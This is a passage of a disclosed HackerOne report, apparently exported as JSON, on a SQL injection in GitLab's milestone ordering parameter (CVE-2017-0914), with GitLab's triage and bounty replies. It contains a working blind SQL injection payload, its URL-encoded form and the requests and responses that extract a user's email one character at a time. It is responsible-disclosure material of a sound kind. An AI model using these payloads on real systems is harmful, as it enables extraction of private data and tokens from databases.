{"id":298176,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTgxNzY=","url":"https://hackerone.com/reports/298176","title":"SQL injection in MilestoneFinder order method","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-12-15T03:15:38.095Z","submitted_at":"2017-12-15T03:15:38.095Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0914"],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-27T02:20:24.581Z","bug_reporter_agreed_on_going_public_at":"2018-04-25T23:41:53.335Z","team_member_agreed_on_going_public_at":"2018-04-27T02:20:24.222Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **index** action is requested, the `milestones` method is called. Here's the first two lines of the method:\n\n**app/controllers/groups/milestones_controller.rb**\n```ruby\ndef milestones\n    search_params = params.merge(group_ids: group.id)\n\n    milestones = MilestonesFinder.new(search_params).execute\n    # ...\n```\n\nThis code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:\n\n**app/finders/milestone_finder.rb**\n```ruby\n  def execute\n    return Milestone.none if project_ids.empty? \u0026\u0026 group_ids.empty?\n\n    items = Milestone.all\n    items = by_groups_and_projects(items)\n    items = by_title(items)\n    items = by_state(items)\n\n    order(items)\n  end\n```\n\nThe `order` call on the last line is implemented as following: \n\n**app/finders/milestone_finder.rb**\n```ruby\n def order(items)\n    if params.has_key?(:order)\n      items.reorder(params[:order])\n    else\n      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')\n      items.reorder(order_statement)\n    end\n  end\n```\n\nAs can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:\n\n**Request**\n```\nGET /groups/my-test-group/-/milestones HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response**\n```json\n[\n  {\n    \"title\": \"3\",\n    \"name\": \"3\",\n    \"id\": 429944\n  },\n  {\n    \"title\": \"4\",\n    \"name\": \"4\",\n    \"id\": 429943\n  }\n]\n```\n\nThen, consider the following SQL injection payload:\n\n```sql\n(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)\n```\n\nThis payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(\u003c\u003e, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **not** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.\n\nTo prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:\n\n**Encoded payload**\n```\n%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\n```\n\nNow submit the first request:\n\n**Request 1 (`a`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open\u0026\u0026order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 1**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"3\",\"name\":\"3\",\"id\":429944},{\"title\":\"4\",\"name\":\"4\",\"id\":429943}]\n```\n\nIn the response above the milestones are sorted **descending** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observer:\n\n**Request 2 (`j`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open\u0026\u0026order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 2**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"4\",\"name\":\"4\",\"id\":429943},{\"title\":\"3\",\"name\":\"3\",\"id\":429944}]\n```\n\nBecause the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.\n\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\n\n## Impact\n\nAn attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.","vulnerability_information_html":"\u003cp\u003eThe \u003ccode\u003eMilestoneFinder\u003c/code\u003e is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the \u003ccode\u003eGroups::MilestonesController\u003c/code\u003e. When the \u003cstrong\u003eindex\u003c/strong\u003e action is requested, the \u003ccode\u003emilestones\u003c/code\u003e method is called. Here\u0026#39;s the first two lines of the method:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eapp/controllers/groups/milestones_controller.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emilestones\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esearch_params\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emerge\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003egroup_ids: \u003c/span\u003e\u003cspan class=\"n\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003emilestones\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eMilestonesFinder\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esearch_params\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eexecute\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# ...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the \u003ccode\u003eexecute\u003c/code\u003e method. Here\u0026#39;s the method:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eapp/finders/milestone_finder.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eexecute\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"no\"\u003eMilestone\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enone\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eproject_ids\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eempty?\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egroup_ids\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eempty?\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eMilestone\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eall\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eby_groups_and_projects\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eby_title\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eby_state\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eorder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eorder\u003c/code\u003e call on the last line is implemented as following: \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eapp/finders/milestone_finder.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eorder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ehas_key?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:order\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ereorder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:order\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eorder_statement\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eGitlab\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eDatabase\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enulls_last_order\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;due_date\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ASC\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ereorder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eorder_statement\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs can be seen on line 2 of the method, \u003ccode\u003ereorder\u003c/code\u003e is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here\u0026#39;s a request example:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /groups/my-test-group/-/milestones HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;title\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;3\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;3\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e429944\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;title\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;4\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;4\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e429943\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen, consider the following SQL injection payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight sql\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eCASE\u003c/span\u003e \u003cspan class=\"n\"\u003eSUBSTR\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"n\"\u003eemail\u003c/span\u003e \u003cspan class=\"k\"\u003eFROM\u003c/span\u003e \u003cspan class=\"n\"\u003eusers\u003c/span\u003e \u003cspan class=\"k\"\u003eWHERE\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;jobertabma\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003eTHEN\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eCASE\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"k\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"mi\"\u003e429944\u003c/span\u003e \u003cspan class=\"k\"\u003eTHEN\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"k\"\u003eELSE\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"k\"\u003eEND\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eELSE\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"k\"\u003eEND\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis payload does three things: it fetches the \u003ccode\u003eemail\u003c/code\u003e column from the \u003ccode\u003eusers\u003c/code\u003e table where the \u003ccode\u003eusername\u003c/code\u003e matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the \u003ccode\u003eemail\u003c/code\u003e (the \u003ccode\u003eSUBSTR(\u0026lt;\u0026gt;, 1, 1)\u003c/code\u003e call) and compares that to a \u003ccode\u003ea\u003c/code\u003e. If that\u0026#39;s the case, it\u0026#39;ll compare the \u003ccode\u003eid\u003c/code\u003e of the current milestone to \u003ccode\u003e429944\u003c/code\u003e. If that is true, it\u0026#39;ll sort on column number 2. If that is \u003cstrong\u003enot\u003c/strong\u003e the case, it\u0026#39;ll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character \u003ccode\u003ea\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eTo prepare the payload, replace \u003ccode\u003e429944\u003c/code\u003e in the payload with a milestone ID of your account and URL encode it:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eEncoded payload\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow submit the first request:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest 1 (\u003ccode\u003ea\u003c/code\u003e)\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open\u0026amp;\u0026amp;order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse 1\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\u0026quot;title\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;id\u0026quot;:429944},{\u0026quot;title\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;id\u0026quot;:429943}]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the response above the milestones are sorted \u003cstrong\u003edescending\u003c/strong\u003e based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter \u003ccode\u003ej\u003c/code\u003e, the following behavior is observer:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest 2 (\u003ccode\u003ej\u003c/code\u003e)\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open\u0026amp;\u0026amp;order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse 2\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\u0026quot;title\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;id\u0026quot;:429943},{\u0026quot;title\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;id\u0026quot;:429944}]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause the first character of my email is actually \u003ccode\u003ej\u003c/code\u003e, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the \u003ccode\u003eSUBSTR\u003c/code\u003e function can be changed to guess characters on other positions of the value.\u003c/p\u003e\n\n\u003cp\u003eThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can extract all information from the a GitLab instance\u0026#39;s database, including private access and shell tokens. These can be used to elevate the user\u0026#39;s privileges, which may lead to arbitrary code execution.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-25T23:41:53.426Z","allow_singular_disclosure_after":-81927957.43978442,"singular_disclosure_allowed":true,"vote_count":38,"voters":["jokebookservice1","sp1d3rs","europa","jobert","bull","michiel","muon4","ramsexy","spam404","0xacb","and 28 more..."],"severity":{"rating":"critical","score":9.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2224873,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nThank you for highlighting and detailing this SQL injection vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads, we expect that we will have a further response for you within the next 2 business days.\n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eThank you for highlighting and detailing this SQL injection vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads, we expect that we will have a further response for you within the next 2 business days.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T04:40:45.904Z","updated_at":"2017-12-15T04:40:45.904Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2232851,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi Jobert,\n\nCongratulations! Due to your detailed findings report #298176, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability. \n\nWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eCongratulations! Due to your detailed findings report \u003ca href=\"/reports/298176\"\u003e#298176\u003c/a\u003e, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability. \u003c/p\u003e\n\n\u003cp\u003eWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security 